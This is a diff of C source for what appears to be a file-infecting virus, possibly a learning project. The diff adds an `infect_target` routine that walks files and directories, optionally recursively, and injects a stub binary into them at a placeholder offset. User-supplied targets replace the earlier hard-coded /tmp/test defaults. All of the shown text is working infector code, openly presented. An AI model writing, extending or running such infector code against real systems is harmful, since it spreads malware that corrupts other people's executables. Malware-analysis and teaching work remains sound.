@@ -37,58 +37,59 @@ int main(void) {
 
 #else
 
-t_args parse_args(int argc, char **argv) {
-	t_args args = {0};
-	args.recursive = 0;
-	for (int i = 1; i < argc; i++)
+static void infect_target(const char *path, const unsigned char *stub,
+	size_t stub_len, size_t offset, bool recursive)
+{
+	struct stat st;
+
+	if (stat(path, &st) == -1)
 	{
-		if (argv[i][0] != '-')
-			break;
-		else if (strcmp(argv[i], "--help") == 0)
-		{
-			// TODO: make a nice usage output
-			exit(0);
-		}
-		else if (strcmp(argv[i], "-r") == 0)
-			args.recursive = 1;
+		LOG("Cannot stat %s\n", path);
+		return ;
 	}
-	return (args);
+	if (S_ISDIR(st.st_mode))
+		infect_dir(path, stub, stub_len, offset, recursive);
+	else if (S_ISREG(st.st_mode))
+		infect_file(path, stub, stub_len, offset);
 }
 
 int main(int argc, char **argv) {
-	t_args args;
+	bool recursive = false;
+	bool has_targets = false;
 
-	args = parse_args(argc, argv);
+	for (int i = 1; i < argc; i++)
+	{
+		if (strcmp(argv[i], "-r") == 0)
+			recursive = true;
+		else if (strcmp(argv[i], "--help") == 0)
+		{
+			LOG("Usage: %s [-r] [targets...]\n", argv[0]);
+			return (0);
+		}
+		else
+			has_targets = true;
+	}
 	void *site = memmem(stub_bin, stub_bin_len, (void*)&placeholders.entry, sizeof(placeholders.entry));
 	if (site == NULL) {
 		LOG("Placeholders not found\n");
 		return (1);
 	}
 	size_t offset = (uintptr_t)site - (uintptr_t)stub_bin - offsetof(struct placeholders, entry);
-	if (argc > 1)
+	if (has_targets)
 	{
-		int i = 1;
-		while (i < argc)
+		for (int i = 1; i < argc; i++)
 		{
 			if (argv[i][0] == '-')
-			{
-				i++;
 				continue ;
-			}
-			if (argv[i][strlen(argv[i]) - 1] == '/')
-				infect_dir(argv[i], stub_bin, stub_bin_len, offset, args.recursive);
-			else
-				infect_file(argv[i], stub_bin, stub_bin_len, offset);
-			i++;
+			infect_target(argv[i], stub_bin, stub_bin_len, offset, recursive);
 		}
 	}
 	else
 	{
-		infect_dir("/tmp/test", stub_bin, stub_bin_len, offset, 0);
-		infect_dir("/tmp/test2", stub_bin, stub_bin_len, offset, 0);
+		infect_dir("/tmp/test", stub_bin, stub_bin_len, offset, recursive);
+		infect_dir("/tmp/test2", stub_bin, stub_bin_len, offset, recursive);
 	}
 	LOG("done\n");
-
 	return (0);
 }
 
